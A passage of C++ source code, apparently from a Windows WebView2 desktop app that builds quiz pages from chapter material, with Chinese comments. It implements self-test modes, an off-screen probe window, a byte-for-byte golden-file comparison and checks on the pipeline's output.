            /* ⚠️ **不拿 `success` 当判据**。实测这次是 0，但同一个值也可能来自别的失败
               （DNS、取消、证书……）；而页面里 iframe 的 onload 又是另一个方向 ——
               **错误响应照样会 onload**。两个信号都不等于语义。
               真正的结果在宿主统计里：deniedCount 有没有 +1、docResponseServed 有没有被误算成成功。 */
            Report(std::string("  [info] 导航完成回调的 success=") + (success ? "1" : "0")
                   + "（只作参考，不参与判分）");
            Report(std::string(st.deniedCount > 0 ? "  [ok]  " : "  [BAD] ")
                   + "被白名单显式拒掉（deniedCount=" + std::to_string(st.deniedCount) + "）");
            Report(std::string(st.docResponseServed == 1 ? "  [ok]  " : "  [BAD] ")
                   + "拒绝的那次**没有**被当成服务成功（docResponseServed 仍然是 "
                   + std::to_string(st.docResponseServed) + "）");
            const bool secondOk = st.deniedCount > 0 && st.docResponseServed == 1;
            selftestResult_ = Json::object();
            selftestResult_["ok"] = (before == 0 && secondOk);
            selftestResult_["lines"] = Json::array();
            Finish((before == 0 && secondOk) ? 0 : 1, "protocol-live 完成");
            return;
        }
    }
    if (!success) {
        navError_ = "页面没能加载成功（" + uiUrl_ + "）";
        log_error(navError_);
        // 自测要看到失败；正常交互下窗口会是一片白，用户自己看得见
        if (!opt_.selftest.empty()) Finish(1);
        return;
    }
    /* 金标准对拍：这里**只置标志**，交给计时器那一拍去推进。
       ⚠️ 不能在这里直接发消息 —— `NavigationCompleted` 是在 WebView2 自己的回调栈上派发的，
       而在回调栈上做同步的宿主→渲染进程调用（`PostWebMessageAsJson` / `ExecuteScript`）
       会**重入死锁**：进程活着、窗口在、日志停在"导航完成"，连计时器都再也轮不到。
       踩过：症状是"跑了十分钟没动静、什么都没有"。 */
    if (!opt_.goldenFixture.empty()) {
        goldenPending_ = true;
        return;
    }
    /* 首启那一路的文件早就存进 pending 了（main 在起窗口之前做的），
       渲染层就绪后会自己来取（app:takePendingFile）。这里**不推事件** ——
       此刻页面的监听器还没挂上，推了也没人听；那正是 oracle 的 pending.js 存在的理由。 */
}

void AppWindow::BringToFront() {
    if (hwnd_ == nullptr) return;
    if (::IsIconic(hwnd_)) ::ShowWindow(hwnd_, SW_RESTORE);
    ::SetForegroundWindow(hwnd_);
}

void AppWindow::OnWebMessage(ICoreWebView2WebMessageReceivedEventArgs* args) {
    if (tearingDown_) return;
    bridge_.OnWebMessage(args);
}

void AppWindow::RunSelftest() {
    if (opt_.selftest == "probe") {
        StartProbe();
        return;
    }
    if (opt_.selftest == "protocol-live") {
        /* 它由 liveStep_ 在导航回调/计时器里推进。走到这里说明第二次导航迟迟没回来 ——
           但**别报"不认识的自测"**（那是一句盖住真因的错话）。 */
        Report("[protocol-live] 第二次导航还没有回来（继续等超时兜底）");
        return;
    }
    if (opt_.selftest == "ui" || opt_.selftest == "all") {
        RunUiScript();
        return;
    }
    if (opt_.selftest == "pipeline-mock" || opt_.selftest == "pipeline-repair"
        || opt_.selftest == "e2e-mock") {
        RunPipelineScript();
        return;
    }
    if (opt_.selftest == "net-fault") {
        RunNetScript();
        return;
    }
    if (opt_.selftest == "pipeline-cancel") {
        RunCancelScript();
        return;
    }
    if (opt_.selftest == "verify") {
        RunVerifyScript();
        return;
    }
    if (opt_.selftest == "book") {
        RunBookScript();
        return;
    }
    if (opt_.selftest == "book-e2e") {
        RunBookE2eScript();
        return;
    }
    if (opt_.selftest == "multi-source") {
        RunMultiSourceScript();
        return;
    }
    if (opt_.selftest == "golden") {
        // 金标准对拍不挂在这一支上：它由 goldenPending_ / goldenStep_ 在计时器里两步推进
        // （理由见 RunGoldenInject 的函数头：不能在 WebView2 的回调栈上做同步调用）。
        return;
    }
    // 其余自测是**无窗口**的（settings / background / env / key-leak / bridge / protocol）：
    // 它们由 main 在创建窗口之前就跑完了，走到这里说明名字写错了 —— 明确报错。
    Report("[BAD] 不认识的自测：" + opt_.selftest);
    Finish(2, "不认识的自测名");
}

void AppWindow::OnScriptResult(const Json& payload) {
    if (payload.is_object() && payload.contains("what") && payload["what"].is_string()
        && payload["what"].get<std::string>() == "golden") {
        const std::string html = (payload.contains("html") && payload["html"].is_string())
                                   ? payload["html"].get<std::string>() : std::string();
        const Json lines = payload.contains("lines") ? payload["lines"] : Json::array();
        log_info("金标准对拍：页面回传了 " + std::to_string(html.size()) + " 字符");
        CompareGolden(html, lines);
        return;
    }
    if (opt_.selftest == "pipeline-mock" || opt_.selftest == "pipeline-repair"
        || opt_.selftest == "e2e-mock") {
        log_info("流水线自测回传了结果");
        HandlePipelineResult(payload);
        return;
    }
    if (opt_.selftest == "net-fault") {
        log_info("网络自测回传了结果");
        HandleNetResult(payload);
        return;
    }
    if (opt_.selftest == "pipeline-cancel") {
        log_info("取消自测回传了结果");
        HandleCancelResult(payload);
        return;
    }
    if (opt_.selftest == "verify") {
        log_info("校验自测回传了结果");
        HandleVerifyResult(payload);
        return;
    }
    if (opt_.selftest == "book") {
        log_info("带上一章自测回传了结果");
        HandleBookResult(payload);
        return;
    }
    if (opt_.selftest == "book-e2e") {
        log_info("多章 / 带上一章端到端自测回传了结果");
        HandleBookE2eResult(payload);
        return;
    }
    if (opt_.selftest == "multi-source") {
        log_info("多来源自测回传了结果");
        HandleMultiSourceResult(payload);
        return;
    }
    log_info("自测脚本回传了结果");
    selftestResult_ = payload;

    /* ui 这一套还要有**宿主自己算出来**的判据：页面说"iframe onload 了"并不等于
       "文档是我们服务出来的"——403 也会 onload（第三路审查证明了这一点）。
       这里读协议统计（它只在**真的服务成功**时才 +1），把结果补进报告的判据行里。 */
    if (opt_.selftest == "ui") {
        const ProtocolStats& st = protocol_stats();
        Json lines = selftestResult_.contains("lines") && selftestResult_["lines"].is_array()
                       ? selftestResult_["lines"] : Json::array();
        auto push = [&](bool ok, const std::string& text) {
            lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + text);
        };
        push(st.docResponseServed > 0,
             "宿主侧统计：文档真的由我们服务（docResponseServed=" + std::to_string(st.docResponseServed) + " > 0）");
        push(st.cspHeaderSent,
             "宿主侧统计：HTML 响应真的带了 CSP 头（cspHeaderSent）");
        selftestResult_["lines"] = std::move(lines);
        // bad 只数新增的这三条 —— 页面自己已经把它那部分的 bad 算好了
        int extraBad = (st.docResponseServed > 0 ? 0 : 1) + (st.cspHeaderSent ? 0 : 1);
        selftestResult_["hostBad"] = extraBad;
        selftestResult_["protocol"] = Json::object();
        selftestResult_["protocol"]["docResponseServed"] = st.docResponseServed;
        selftestResult_["protocol"]["deniedCount"] = st.deniedCount;
        selftestResult_["protocol"]["cspHeaderSent"] = st.cspHeaderSent;
        selftestResult_["protocol"]["wrcAll"] = st.wrcAll;   // 诊断用：请求到底进没进来
        selftestResult_["protocol"]["lastDocUrl"] = st.lastDocUrl;
    }
    bool ok = payload.is_object() && payload.contains("ok") && payload["ok"].is_boolean()
              && payload["ok"].get<bool>();
    if (selftestResult_.contains("hostBad") && selftestResult_["hostBad"].get<int>() > 0) ok = false;
    if (payload.is_object() && payload.contains("lines") && payload["lines"].is_array()) {
        for (const Json& l : payload["lines"]) {
            if (l.is_string()) Report(l.get<std::string>());
        }
    }
    if (!payload.is_object() || !payload.contains("lines")) {
        Report("[BAD] 自测脚本回传的结果里没有结果明细（lines）");
    }
    Finish(ok ? 0 : 1, "自测脚本回传结果");
}

/* ============================ 离屏探针窗口 ============================
 * 纲领 §5 Phase 1 要求"主窗口 + 离屏探针窗口"。这里做的是**最小但完整**的那一份：
 *   · 自己的窗口（**可见**，摆在 -32000,-32000 —— `show:false` 那类折中拿不到真几何信息，
 *     Phase 0 判据 3 验过）；
 *   · 自己的 WebView2 environment 与**自己的 user data 目录**（不能与主窗口共用：
 *     Phase 0 的坑 3 记着"同一个 user data folder 的接力会让 CreateController 干等"）；
 *   · 自己的协议安装（`protocol_install` 现在按 webview 装，见 protocol.cpp 的说明）。
 *
 * 现在只验"能开、能加载、能读回 document.title"；Phase 5 把探针注入与 title 解析接上。
 */
void AppWindow::StartProbe() {
    if (probeHwnd_ != nullptr) return;
    /* 探针用自己的窗口类；`WS_EX_TOOLWINDOW` 让它不进任务栏/Alt-Tab
       （它是"离屏的校验窗口"，不该在用户面前出现）。 */
    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = &ProbeWndProcThunk;
    wc.hInstance = hInst_;
    wc.hCursor = ::LoadCursorW(nullptr, IDC_ARROW);
    wc.lpszClassName = kProbeClass;
    ::RegisterClassExW(&wc);   // 已注册时返回 0 也继续（重复创建探针不致命）
    /* 探针也是 DIP：900×700 的客户区在 200% 下必须建 1800×1400 物理像素，
       否则页面的 innerWidth 会从 900 掉到 450，布局与探针读数全都跟着变。 */
    probeHwnd_ = ::CreateWindowExW(WS_EX_TOOLWINDOW, kProbeClass, L"ISG 探针", WS_OVERLAPPEDWINDOW,
                                   -32000, -32000, dip_to_px(900), dip_to_px(700),
                                   nullptr, nullptr, hInst_, nullptr);
    if (probeHwnd_ == nullptr) {
        Report("[BAD] 建不出探针窗口");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "建不出探针窗口");
        return;
    }
    ::ShowWindow(probeHwnd_, SW_SHOW);     // 句柄再小也要**真的可见**，且摆在屏幕外
    ::UpdateWindow(probeHwnd_);
    Report("[probe] 离屏探针窗口已创建（-32000,-32000，可见）");

    const std::wstring probeData = user_data_dir() + L"\\WebView2\\probe";
    std::error_code ec;
    std::filesystem::create_directories(std::filesystem::path(probeData), ec);

    auto options = Microsoft::WRL::Make<CoreWebView2EnvironmentOptions>();
    if (!options) { Finish(2, "探针环境选项创建失败"); return; }
    options->put_AdditionalBrowserArguments(kBrowserArgs);
    if (!protocol_register_scheme(options.Get())) {
        Report("[BAD] 探针 environment 登记 isg:// 失败");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "探针 environment 登记 isg:// 失败");
        return;
    }
    const HRESULT hr = ::CreateCoreWebView2EnvironmentWithOptions(
        nullptr, probeData.c_str(), options.Get(),
        Microsoft::WRL::Callback<ICoreWebView2CreateCoreWebView2EnvironmentCompletedHandler>(
            [this](HRESULT r, ICoreWebView2Environment* env) -> HRESULT { OnProbeEnvReady(r, env); return S_OK; }).Get());
    if (FAILED(hr)) {
        Report("[BAD] 创建探针环境失败（0x" + std::to_string(static_cast<unsigned long>(hr)) + "）");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "创建探针环境失败");
    }
}

void AppWindow::OnProbeEnvReady(HRESULT hr, ICoreWebView2Environment* env) {
    if (tearingDown_) return;
    if (FAILED(hr) || env == nullptr) {
        Report("[BAD] 探针 environment 创建失败（0x" + std::to_string(static_cast<long>(hr)) + "）");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "探针 environment 创建失败");
        return;
    }
    probeEnv_ = env;
    const HRESULT hr2 = probeEnv_->CreateCoreWebView2Controller(
        probeHwnd_,
        Microsoft::WRL::Callback<ICoreWebView2CreateCoreWebView2ControllerCompletedHandler>(
            [this](HRESULT r, ICoreWebView2Controller* c) -> HRESULT { OnProbeControllerReady(r, c); return S_OK; }).Get());
    if (FAILED(hr2)) {
        Report("[BAD] 创建探针控制器失败");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "创建探针控制器失败");
    }
}

void AppWindow::OnProbeControllerReady(HRESULT hr, ICoreWebView2Controller* c) {
    if (tearingDown_) return;
    if (FAILED(hr) || c == nullptr) {
        Report("[BAD] 探针控制器创建失败");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "探针控制器创建失败");
        return;
    }
    probeController_ = c;
    RECT rc{};
    ::GetClientRect(probeHwnd_, &rc);
    probeController_->put_Bounds(rc);
    probeController_->put_IsVisible(TRUE);
    if (FAILED(probeController_->get_CoreWebView2(&probeWebview_)) || !probeWebview_) {
        Report("[BAD] 探针拿不到 ICoreWebView2");
        Finish(2, "探针拿不到 ICoreWebView2");
        return;
    }
    /* 探针窗口的协议**单独装**（它自己的 environment / webview）。 */
    protocol_install(probeWebview_.Get());
    probeWebview_->add_NavigationCompleted(
        Microsoft::WRL::Callback<ICoreWebView2NavigationCompletedEventHandler>(
            [this](ICoreWebView2*, ICoreWebView2NavigationCompletedEventArgs* a) -> HRESULT {
                BOOL ok = FALSE;
                a->get_IsSuccess(&ok);
                OnProbeNavCompleted(ok);
                return S_OK;
            }).Get(), &probeNavToken_);
    probeNavHooked_ = true;

    /* 夹具页写在探针自己的 user data 目录里，并**显式放行**它的目录 ——
       与产品里"只服务显式放行过的目录"是同一条规则。 */
    const std::wstring dir = user_data_dir() + L"\\WebView2\\probe";
    const std::wstring page = dir + L"\\probe-fixture.html";
    write_file_bytes(page, "<!doctype html><meta charset=\"utf-8\"><title>isg-probe</title><p>probe</p>");
    protocol_allow(page);
    probeUrl_ = protocol_url_for(page);
    Report("[probe] 在探针窗口里加载 isg:// 文档");
    probeWebview_->Navigate(to_wide(probeUrl_).c_str());
}

void AppWindow::OnProbeNavCompleted(BOOL success) {
    if (tearingDown_) return;
    Report(std::string(success ? "  [ok]  " : "  [BAD] ") + "探针窗口里加载了 isg:// 文档");
    if (!success) { Finish(1, "探针窗口加载失败"); return; }
    probeWebview_->ExecuteScript(
        L"document.title",
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR json) -> HRESULT { OnProbeTitle(hr, json); return S_OK; }).Get());
}

void AppWindow::OnProbeTitle(HRESULT hr, LPCWSTR json) {
    if (tearingDown_) return;
    const std::string title = json_unescape_string(to_utf8(json ? json : L""));
    const bool ok = SUCCEEDED(hr) && title == "isg-probe";
    Report(std::string(ok ? "  [ok]  " : "  [BAD] ") + "读回了探针窗口里的 document.title："
           + json_quote(title) + "（期望 \"isg-probe\"）");
    const ProtocolStats& st = protocol_stats();
    Report(std::string(st.docResponseServed > 0 ? "  [ok]  " : "  [BAD] ")
           + "探针窗口的文档也由我们服务（docResponseServed=" + std::to_string(st.docResponseServed) + "）");
    const bool allOk = ok && st.docResponseServed > 0;
    selftestResult_ = Json::object();
    selftestResult_["ok"] = allOk;
    selftestResult_["lines"] = Json::array();
    Finish(allOk ? 0 : 1, "探针自测完成");
}

void AppWindow::TeardownProbe() {
    if (probeWebview_ && probeNavHooked_) {
        probeWebview_->remove_NavigationCompleted(probeNavToken_);
        probeNavHooked_ = false;
    }
    if (probeController_) {
        probeController_->Close();
        probeController_.Reset();
    }
    probeWebview_.Reset();
    probeEnv_.Reset();
    if (probeHwnd_ != nullptr) {
        ::DestroyWindow(probeHwnd_);
        probeHwnd_ = nullptr;
    }
    // 窗口都销毁之后再注销类（还有窗口在时 UnregisterClass 必然失败）
    ::UnregisterClassW(kProbeClass, hInst_);
}

/* 金标准对拍第 1 步：把搬过来的纯逻辑 JS 注入到执行页里。
 *
 * ⚠️ 为什么分两步、而且要由计时器驱动（不能一口气做完）：
 * `NavigationCompleted` / `ExecuteScript` 的回调都在 **WebView2 自己的回调栈上**，
 * 而在那里面调 `PostWebMessageAsJson`（一次同步的宿主→渲染进程调用）会**重入死锁** ——
 * 进程活着、窗口在、日志停在上一行，计时器也再也轮不到。踩过：症状是"跑了十分钟没动静"。
 * 所以：注入 → 下一拍再发夹具 → 等结果。每一拍都在主线程自己的消息循环里。
 */
void AppWindow::RunGoldenInject() {
    if (webview_ == nullptr) return;
    selftestStarted_ = true;      // 同时是硬超时的开关（见 WM_TIMER）
    bridge_.SetTraceSink([this](const std::string& text) { Report("[golden trace] " + text); });
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });

    const std::wstring bundlePath = exe_dir() + L"\\web\\logic\\logic-bundle.js";
    std::string bundle;
    if (!read_file_bytes(bundlePath, bundle)) {
        Report("[BAD] 读不到 logic-bundle.js：" + to_utf8(bundlePath)
               + "（先跑 node tools/golden/bundle-logic.js --write）");
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "读不到 logic-bundle.js");
        return;
    }
    log_info("注入 logic-bundle.js（" + std::to_string(bundle.size()) + " 字节）");
    webview_->ExecuteScript(
        to_wide(bundle).c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] 注入 logic-bundle.js 失败（0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                } else {
                    log_info("logic-bundle.js 注入完成");
                }
                /* 这里**只记日志**，不继续往下发夹具（理由见函数头：不能在回调栈上做同步调用）。 */
                return S_OK;
            }).Get());
}

/* 第 2 步：把夹具注入页面。
 *
 * ⚠️ **不走 postMessage**，两条路都试过：
 *   ① 直接把对象放进消息 → 会经 Chromium 的 `base::Value`，而那一层的字典**按键名排序**，
 *      到了页面上键序已经变了 —— 产出的题库 JSON 与 oracle 不同，逐字节对拍必然失败
 *      （这条是金标准对拍自己抓到的，不是推理）；
 *   ② 把 JSON 塞进字符串再传 → 161 KB 的消息页面上收不到（监听器根本不触发，也没有报错）。
 * 最后用最笨也最确定的一条：ExecuteScript 把夹具写进页面的一个全局变量，页面轮询它。
 * 这条路上没有序列化、没有消息边界、没有大小上限的猜测 —— 只有"到了"和"没到"。
 */
void AppWindow::RunGoldenSend() {
    if (webview_ == nullptr) return;
    Json fixture;
    std::string err;
    if (!json_read_file(opt_.goldenFixture, fixture, err)) {
        Report("[BAD] 读不到夹具：" + err);
        selftestResult_ = Json::object();
        selftestResult_["ok"] = false;
        Finish(2, "读不到金标准夹具");
        return;
    }
    const std::string fixtureText = json_dump(fixture, -1);
    Report("[golden] 夹具已读入（" + std::to_string(fixtureText.size()) + " 字节）");
    const std::string script =
        "window.__ISG_GOLDEN_TEXT = " + json_quote(fixtureText) + ";\n"
        "window.__ISG_GOLDEN_READY = 1;\n";
    webview_->ExecuteScript(
        to_wide(script).c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] 夹具注入失败（0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                } else {
                    Report("[golden] 夹具已注入页面");
                }
                return S_OK;
            }).Get());
}

/* 金标准对拍的判据：**逐字节相同**。
   差异只允许出现在显式列举的地方（时间戳、随机 id），而这份夹具刻意不含任何一处
   （generator 字段在 oracle 那边才带版本号，夹具里没给）。 */
void AppWindow::CompareGolden(const std::string& actualHtml, const Json& extraLines) {
    if (extraLines.is_array()) {
        for (const Json& l : extraLines) {
            if (l.is_string()) Report(l.get<std::string>());
        }
    }
    if (actualHtml.empty()) {
        Report("[BAD] 对拍执行页没有产出 HTML");
        Finish(1, "金标准对拍没产出");
        return;
    }
    std::string actualBytes;
    if (!write_file_bytes(opt_.goldenActual, actualHtml)) {
        Report("[BAD] 写不出 actual.html：" + to_utf8(opt_.goldenActual));
        Finish(2, "写不出 actual.html");
        return;
    }
    std::string expectedBytes;
    if (!read_file_bytes(opt_.goldenExpected, expectedBytes)) {
        Report("[BAD] 读不到 expected.html：" + to_utf8(opt_.goldenExpected));
        Report("       先跑 node tools/golden/make-golden.js 产出基准");
        Finish(2, "读不到 expected.html");
        return;
    }
    read_file_bytes(opt_.goldenActual, actualBytes);

    const std::string wantSha = sha256_hex(expectedBytes);
    const std::string gotSha = sha256_hex(actualBytes);
    Report("  expected：" + std::to_string(expectedBytes.size()) + " 字节 sha256=" + wantSha.substr(0, 16));
    Report("  actual  ：" + std::to_string(actualBytes.size()) + " 字节 sha256=" + gotSha.substr(0, 16));
    const bool same = (expectedBytes == actualBytes);
    Report(std::string(same ? "  [ok]  " : "  [BAD] ")
           + "C++ 侧跑出来的页面与 oracle 的产物**逐字节相同**");
    if (!same) {
        // 差异要能定位：报告第一个不同的偏移与两侧的上下文（不给全文，太吵）
        size_t i = 0;
        const size_t n = expectedBytes.size() < actualBytes.size() ? expectedBytes.size() : actualBytes.size();
        while (i < n && expectedBytes[i] == actualBytes[i]) ++i;
        Report("        第一个差异在偏移 " + std::to_string(i) + "（长度 "
               + std::to_string(expectedBytes.size()) + " vs " + std::to_string(actualBytes.size()) + "）");
        auto context = [](const std::string& s, size_t at) {
            const size_t from = at > 60 ? at - 60 : 0;
            return json_quote(s.substr(from, 140));
        };
        Report("        expected 附近：" + context(expectedBytes, i));
        Report("        actual   附近：" + context(actualBytes, i));
    }
    selftestResult_ = Json::object();
    selftestResult_["ok"] = same;
    selftestResult_["lines"] = Json::array();
    Finish(same ? 0 : 1, "金标准对拍完成");
}

void AppWindow::RunUiScript() {
    /* 在**真页面**里跑桥的端到端检查。
       为什么非要真页面：这一层要验的恰恰是"渲染层原样搬过来还能不能动"——
       桥的方法名、信封形状、事件订阅、以及**未实现的通道会不会明确报错**，
       全都只有把真脚本加载起来才验得到。 */
    Report("[ui] 在真页面里跑桥的端到端检查");
    /* 页面里的每一步都往报告里落一行 —— 卡住时"停在哪一步"就是直接证据。 */
    bridge_.SetTraceSink([this](const std::string& text) { Report("[ui trace] " + text); });
    /* 结果由页面**主动送回来**（WebView2 的 ExecuteScript 不等 Promise，见 bridge.h）。 */
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });

    /* 造一个"已放行"的探针页，把它的路径填进脚本的占位符。
       为什么要一个真文件：这一段要验的是"isg:// 真的把文档服务出来了"，
       而 servable 的前提是"用户在界面上选过这个位置"——自测里没有界面可点，
       所以由宿主自己扮演那个角色：写一个文件 + 显式放行它的目录。 */
    std::wstring script = to_wide(selftest_ui_script());
    {
        const std::wstring dir = user_data_dir() + L"\\selftest";
        std::error_code ec;
        std::filesystem::create_directories(std::filesystem::path(dir), ec);
        const std::wstring probe = dir + L"\\probe-page.html";
        write_file_bytes(probe, "<!doctype html><meta charset=\"utf-8\"><title>isg probe</title>ok");
        protocol_allow(probe);
        script = replace_wstr(script, L"__ISG_PROBE_HTML__", to_wide(json_quote(to_utf8(probe))));

        /* 抽取自测的夹具：一份三节的 Markdown。**由宿主扮演"用户选过这个文件"**
           （写文件 + 显式放行），这样 extract:preview 的白名单判据仍然是真的。 */
        const std::wstring extractFixture = dir + L"\\extract-fixture.md";
        write_file_bytes(extractFixture,
            "# 第一章 大地测量基础\n\n正文第一段。\n\n"
            "## 1.1 椭球参数\n\n长半轴 a = 6378137 m。\n\n"
            "## 1.2 常用坐标系\n\n这里有三种坐标系。\n");
        protocol_allow(extractFixture);
        script = replace_wstr(script, L"__ISG_EXTRACT_FILE__",
                              to_wide(json_quote(to_utf8(extractFixture))));
    }
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR jsonResult) -> HRESULT {
                if (tearingDown_) return S_OK;
                /* ⚠️ 这个回调**只说明脚本被送进去并开始跑了**，不说明它跑完了 ——
                   WebView2 不等 Promise，返回的 `{}` 是"Promise 没法序列化"的意思。
                   真正的结果由页面通过 selftestResult 消息回传（见 bridge.h）。
                   这里只把异常报出来：脚本**语法错误**时会走这一支，那时候页面侧
                   一个 trace 都不会有，必须有个地方说明原因。 */
                if (FAILED(hr)) {
                    Report("[BAD] 页面里的检查脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）——多半是语法错误");
                    Finish(1, "自测脚本执行失败");
                    return S_OK;
                }
                log_info("自测脚本已注入（返回 " + std::to_string(jsonResult ? std::wcslen(jsonResult) : 0)
                         + " 字符；Promise 不等，结果走消息回传）");
                return S_OK;
            }).Get());
}

void AppWindow::RunPipelineScript() {
    if (opt_.pipelineFixture.empty() || opt_.pipelineOut.empty()) {
        Report("[BAD] pipeline-mock 需要 --pipeline-fixture= 与 --pipeline-out=");
        Finish(2, "缺少 pipeline 自测参数");
        return;
    }
    /* 自测里由宿主扮演"用户在界面里选过这两个位置"：材料与输出目录都显式放行。
       不放行的话 extract:preview 会被白名单拒掉，而症状会被误读成"流水线坏了"。 */
    protocol_allow(opt_.pipelineFixture);
    protocol_allow(opt_.pipelineOut);
    pipelineStartMs_ = std::chrono::duration_cast<std::chrono::milliseconds>(
                           std::chrono::system_clock::now().time_since_epoch()).count();

    bridge_.SetTraceSink([this](const std::string& text) { Report("[pipeline trace] " + text); });
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });

    std::wstring script = to_wide(selftest_pipeline_script());
    script = replace_wstr(script, L"__ISG_PIPELINE_FIXTURE__",
                          to_wide(json_quote(to_utf8(opt_.pipelineFixture))));
    script = replace_wstr(script, L"__ISG_PIPELINE_OUT__",
                          to_wide(json_quote(to_utf8(opt_.pipelineOut))));
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] pipeline 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）——多半是语法错误");
                    Finish(1, "pipeline 自测脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandlePipelineResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) bad++;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };

    const std::string htmlPath = payload.value("htmlPath", std::string());
    std::string html;
    const bool read = !htmlPath.empty() && read_file_bytes(to_wide(htmlPath), html);
    add(read, "宿主读到了产物文件", read ? (std::to_string(html.size()) + " 字节") : htmlPath);
    if (read) {
        /* 产物必须是**本次**写出来的：否则上一轮的 HTML 会满足下面所有内容判据，
           而这一轮可能一条写文件消息都没到（这正是 guidance4 记下的那类静默失效）。 */
        add(stat_path(to_wide(htmlPath)).mtimeMs >= pipelineStartMs_ - 500,
            "产物是本次新写的（mtime 晚于测试开始）",
            std::to_string(stat_path(to_wide(htmlPath)).mtimeMs) + " vs " + std::to_string(pipelineStartMs_));
        add(html.size() > 10000, "产物不是空壳（> 10 KB）", std::to_string(html.size()));
        add(html.find("data-bank") != std::string::npos, "产物里有题库脚本块（data-bank）");
        add(html.find("id=\"s-total\"") != std::string::npos, "产物里有吸顶进度条的 s-total");
        add(html.find("class=\"demo\"") != std::string::npos, "产物里有演示块");
        const bool has200 = html.find("\"ans\":200") != std::string::npos
                         || html.find("\"ans\": 200") != std::string::npos;
        add(has200, "题库里有正确的 200（审题之后落进页面的是正确值）");
        const bool has999 = html.find("\"ans\":999") != std::string::npos
                         || html.find("\"ans\": 999") != std::string::npos;
        add(!has999, "题库里不再有假模型第一次写错的 999（审题真的抓住了）");
    }

    const Json audit = payload.contains("audit") ? payload["audit"] : Json();
    const int rounds = (audit.is_object() && audit.contains("rounds") && audit["rounds"].is_number())
                           ? audit["rounds"].get<int>() : 0;
    add(rounds >= 1, "独立审题真的跑过（audit.rounds ≥ 1）", "rounds=" + std::to_string(rounds));
    const int high = (audit.is_object() && audit.contains("high") && audit["high"].is_number())
                         ? audit["high"].get<int>() : 0;
    add(high >= 1, "审题确认了至少一处答案级问题（audit.high ≥ 1）", "high=" + std::to_string(high));

    const Json usage = payload.contains("usage") ? payload["usage"] : Json();
    const int calls = (usage.is_object() && usage.contains("calls") && usage["calls"].is_number())
                          ? usage["calls"].get<int>() : 0;
    add(calls > 0, "模型调用被计数（usage.calls > 0）", "calls=" + std::to_string(calls));

    /* 日志里要有"按审题意见重出"这一句 —— 只凭最终 200 证明不了它来自审题
       （假模型也可能第二次就写对）。 */
    const std::string jobId = payload.value("jobId", std::string());
    bool sawAuditLog = false;
    bool sawEditedLog = false;
    bool optionsOk = false;
    if (!jobId.empty()) {
        const Json j = jobs_.Get(jobId);
        if (j.is_object() && j.contains("logs") && j["logs"].is_array()) {
            for (const Json& l : j["logs"]) {
                if (!l.is_object()) continue;
                const std::string msg = l.value("message", std::string());
                if (msg.find("独立确认") != std::string::npos
                    && msg.find("按意见重出") != std::string::npos) sawAuditLog = true;
                if (msg.find("采用了用户手工修订") != std::string::npos) sawEditedLog = true;
            }
        }
        /* 界面真实字段名 → 流水线字段名：
           `quizTarget` 必须变成 `points`、`chapterTitle` 必须变成 `title`。 */
        if (j.is_object() && j.contains("options") && j["options"].is_object()) {
            const Json& o = j["options"];
            const bool pointsOk = o.contains("points") && o["points"].is_number()
                                  && o["points"].get<int>() == 40;
            const bool titleOk = o.contains("title") && o["title"].is_string()
                                 && o["title"].get<std::string>() == "测试章";
            const bool petOk = o.contains("pet") && o["pet"].is_string()
                               && o["pet"].get<std::string>() == "none";
            optionsOk = pointsOk && titleOk && petOk;
        }
    }
    add(sawAuditLog, "任务日志里有「答案级问题被独立确认 → 按意见重出」");
    add(optionsOk, "界面字段名被归一（quizTarget→points、chapterTitle→title）");
    add(sawEditedLog, "用户逐页修订真的进了流水线（日志里有「采用了用户手工修订」）");

    /* Phase 5：探针报告真的回到了宿主（而不是只在页面里自我感觉良好）。 */
    bool hasReport = false;
    int reportItems = 0;
    bool allItemsOk = false;
    bool hasDemoItem = false;
    bool badDemoItem = false;
    bool demoNoteHas999 = false;
    bool verifyStageDone = false;
    bool repairStageDone = false;
    std::string repairDetail;
    bool sawVerifyLog = false;
    bool sawDemoRegen = false;
    if (!jobId.empty()) {
